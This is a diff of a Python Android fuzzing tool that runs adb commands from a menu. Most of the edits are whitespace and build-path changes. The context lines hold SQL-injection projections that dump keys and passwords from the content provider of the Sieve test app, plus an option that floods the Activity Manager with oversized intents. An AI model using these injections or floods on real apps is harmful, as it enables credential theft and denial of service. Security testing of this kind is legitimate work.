@@ -11,11 +11,20 @@
 
 import os
 import re
-from intent_bifuz import *	
+from intent_bifuz import *    
 from broadcast_bifuz import *
 from common import *
 from time import time
 import random
+from commands import *
+import fileinput
+import sys
+
+def replaceLine(file,linestart,replaceline):
+    for line in fileinput.input(file, inplace=1):
+        if linestart in line:
+            line = line.replace(line,replaceline)
+        sys.stdout.write(line)
 
 
 def get_root_path(intents_file):
@@ -91,7 +100,7 @@ if __name__ == '__main__':
     loop = True
     devices_list = []
     while loop:
-		#option 1
+        #option 1
         if (choice == "1"):
             print("\nYou have selected option 1. Select Devices Under Test")
 
@@ -208,14 +217,14 @@ file containing the intents:  "))
             if not packages:
                 print_menu()
             else:
-		#get all contents providers
+        #get all contents providers
                 contents=get_apks(devices_list, packages.strip())
                 print contents 
                 select_key="'* FROM Key;--'"
                 select_pass="'quote(password) FROM Passwords;--'"
                 command_get_key="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_key; 
                 command_get_pass="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_pass; 
-		#get keys
+        #get keys
                 print command_get_key
                 print "KEY and User  ";
                 print run_inadb(devices_list[0], command_get_key)
@@ -239,7 +248,18 @@ file containing the intents:  "))
                     print "*ERROR* unavailable devices"
                     loop = False
                     continue
-				#put seed folder on device             				
+                #change path for buidlozer spec
+                sdk=getoutput('printenv ANDROIDSDK')
+                ndk=getoutput('printenv ANDROIDNDK')
+                replaceLine('kivy-android/buildozer.spec','android.ndk_path','android.ndk_path = '+ ndk + "\n")
+                replaceLine('kivy-android/buildozer.spec','android.sdk_path','android.sdk_path = '+ sdk + "\n")
+                
+                pyforandroid_dir=getoutput("find /home -type d -name python-for-android")
+                paths=pyforandroid_dir.split('\n')
+                for line in paths:
+                    if (line.find('denied')==-1):
+                        replaceLine('kivy-android/buildozer.spec','android.p4a_dir','android.p4a_dir = '+ line + "\n")
+                #put seed folder on device                             
                 copy_file_command='push ' + seed_folder +' /data/local/tmp/test/'
                 print copy_file_command
                 print run_inadb(devices_list[0], copy_file_command)
@@ -258,18 +278,18 @@ file containing the intents:  "))
 
         #option 8
         elif (choice == "8"):
-			#buffer overflow against Activity Manager run on the first device in the list
-			if len(devices_list) == 0:
-				devices_list = get_devices_list()
-				if devices_list is not False:
-					devices_list = [devices_list[0]]
-			repetitions = str(raw_input("How many large intents would like to send? (enter an int larger than 0) "))
-			ip = str(devices_list[0])
-			for i in range(int(repetitions)):
-				buffer_overflow(ip)
-			loop = False
-		
-		#option 9	
+            #buffer overflow against Activity Manager run on the first device in the list
+            if len(devices_list) == 0:
+                devices_list = get_devices_list()
+                if devices_list is not False:
+                    devices_list = [devices_list[0]]
+            repetitions = str(raw_input("How many large intents would like to send? (enter an int larger than 0) "))
+            ip = str(devices_list[0])
+            for i in range(int(repetitions)):
+                buffer_overflow(ip)
+            loop = False
+        
+        #option 9    
         elif (choice == "9"):
            print ("\nYou have selected option 9")
            #smart fuzzing - based on templates
@@ -292,8 +312,8 @@ file containing the intents:  "))
            list_test_pack = []
            look_for_test_pack = getoutput("adb -s %s shell pm list packages | grep %s"%(ip,test_pack))
            for tp in look_for_test_pack.strip().split("package:"):
-			   if tp!="":
-				   list_test_pack.append(tp.strip())
+               if tp!="":
+                   list_test_pack.append(tp.strip())
            '''
            #test_pack - activity to be tested - for testing purposes we use all gms Activities
            
